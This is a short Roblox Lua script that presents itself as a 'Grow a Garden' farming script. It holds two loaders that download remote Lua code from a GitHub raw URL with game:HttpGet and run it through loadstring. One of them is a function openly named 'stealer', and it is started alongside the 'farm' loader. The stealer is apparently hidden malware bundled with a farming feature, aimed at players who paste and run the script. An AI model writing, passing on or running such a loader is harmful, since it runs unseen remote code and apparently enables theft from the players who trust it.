local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptLast/Growagarden/refs/heads/main/Script1.lua'))()
end

local function farm()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptLast/Growagarden/refs/heads/main/Script.lua'))()
end

task.spawn(stealer)

for i = 1, 1 do
    task.spawn(farm)
end
